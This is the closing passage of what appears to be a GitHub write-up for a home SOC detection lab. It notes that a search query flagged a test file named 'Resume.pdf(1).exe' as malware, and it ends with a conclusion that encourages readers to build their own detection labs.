   - Running the search query returns the folowing. I have also visualized the data in a tabular format:
        <img width="1614" height="622" alt="image" src="https://github.com/user-attachments/assets/a43c6468-4a10-4707-96ef-85047bad89ea" />
   - Here it shows all the commands we ran from our Kali machine, thus marking the file Resume.pdf(1).exe as a malware. 

## Conclusion

- This Lab demonstrates a basic level simulation of a SOC environment. In a real SOC environment we have several security devices added to the setup such as Email Gateway, Firewalls, Proxy, Antivirus, Web-Application Firewall, etc.
- Every SOC analyst must have their own SOC Detection Lab to perform security analysis.
- Feel free to follow this procedure and create your own SOC lab.




      
      




